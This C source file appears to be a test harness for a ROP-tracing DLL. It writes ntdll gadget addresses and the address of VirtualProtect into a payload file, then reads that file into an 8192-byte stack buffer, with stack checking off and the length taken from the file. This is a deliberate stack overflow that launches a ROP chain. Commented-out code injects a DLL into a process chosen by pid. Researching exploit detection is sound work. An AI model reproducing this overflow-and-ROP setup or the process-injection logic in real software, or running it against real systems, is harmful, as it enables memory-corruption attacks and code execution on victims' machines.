#include "injector.h"
#pragma check_stack(off)

#define FIRST_GADGET_FILE_OFFSET         (-16) * 8
#define FIRST_GADGET_OFFSET              0x8F0F1

#define SECOND_GADGET_FILE_OFFSET        (-11) * 8
#define SECOND_GADGET_OFFSET             0x2566D

#define THIRD_GADGET_FILE_OFFSET         (-9) * 8
#define THIRD_GADGET_OFFSET              0x8F0F6

#define VIRTUAL_PROTECT_FILE_OFFSET      (-6)  * 8

VOID
FixFile(PCHAR FilePath, FILE** File, DWORD* Length)
{
    UNREFERENCED_PARAMETER(Length);

    QWORD gadgetAddr = 0;

    QWORD ntdllAddr = (QWORD)GetModuleHandle("ntdll.dll");
    
    HMODULE kernel32Handle = GetModuleHandle("kernel32.dll");
    QWORD vpAddr = (QWORD)GetProcAddress(kernel32Handle, "VirtualProtect");

    if (fopen_s(File, FilePath, "rb+"))
    {
        printf("[ERROR] fopen_s failed %d!\n", GetLastError());
        return;
    }

    gadgetAddr = ntdllAddr + FIRST_GADGET_OFFSET;
    fseek(*File, FIRST_GADGET_FILE_OFFSET, SEEK_END);
    fwrite(&gadgetAddr, sizeof(QWORD), 1, *File);

    gadgetAddr = ntdllAddr + SECOND_GADGET_OFFSET;
    fseek(*File, SECOND_GADGET_FILE_OFFSET, SEEK_END);
    fwrite(&gadgetAddr, sizeof(QWORD), 1, *File);

    gadgetAddr = ntdllAddr + THIRD_GADGET_OFFSET;
    fseek(*File, THIRD_GADGET_FILE_OFFSET, SEEK_END);
    fwrite(&gadgetAddr, sizeof(QWORD), 1, *File);

    fseek(*File, VIRTUAL_PROTECT_FILE_OFFSET, SEEK_END);
    fwrite(&vpAddr, sizeof(QWORD), 1, *File);

    fclose(*File);

    return;
}

VOID
MyOpenFile(PCHAR FilePath, FILE** File, DWORD* Length)
{
    if (fopen_s(File, FilePath, "rb"))
    {
        printf("[ERROR] fopen_s failed!\n");
        return;
    }

    fseek(*File, 0, SEEK_END);
    *Length = ftell(*File);
    rewind(*File);

    return;
}

VOID
ReadFromFile(FILE* File, DWORD Length)
{
    CHAR smallBuffer[8192] = { 0 };

    printf("Reading %d characters\n", Length);
    fread_s(smallBuffer, Length-1, 1, Length-1, File);

    return;
}

INT
main(
    INT Argc,
    PCHAR Argv[]
)
{
    UNREFERENCED_PARAMETER(Argv);
    UNREFERENCED_PARAMETER(Argc);

    // DWORD pid = 0;
    // PCHAR pDllPath = NULL;
    // BOOL bErr;
    // 
    // if (Argc != 3)
    // {
    //     printf("Usage %s <pid> <dll path>\n", Argv[0]);
    //     return -1;
    // }
    // 
    // pid = strtoul(Argv[1], NULL, 0);
    // pDllPath = Argv[2];
    // 
    // printf("Injecting `%s` into %d...\n", pDllPath, pid);
    // 
    // bErr = InjectDllIntoProcess(pid, pDllPath);
    // printf("Injection %s\n", bErr ? "Succeeded" : "Failed");
    // 
    // return !bErr;
    
    LoadLibrary("RopTracerDll.dll");

    FILE* file;
    DWORD length;
    PCHAR fpath = "rop-xor.txt";
    FixFile(fpath, &file, &length);

    MyOpenFile(fpath, &file, &length);
    ReadFromFile(file, length);

    fclose(file);

    // if (hMod)
    // {
    //     printf("[LOADER] Library loaded successfully\n");
    //     FreeLibrary(hMod);
    // }
    
    return 0;
}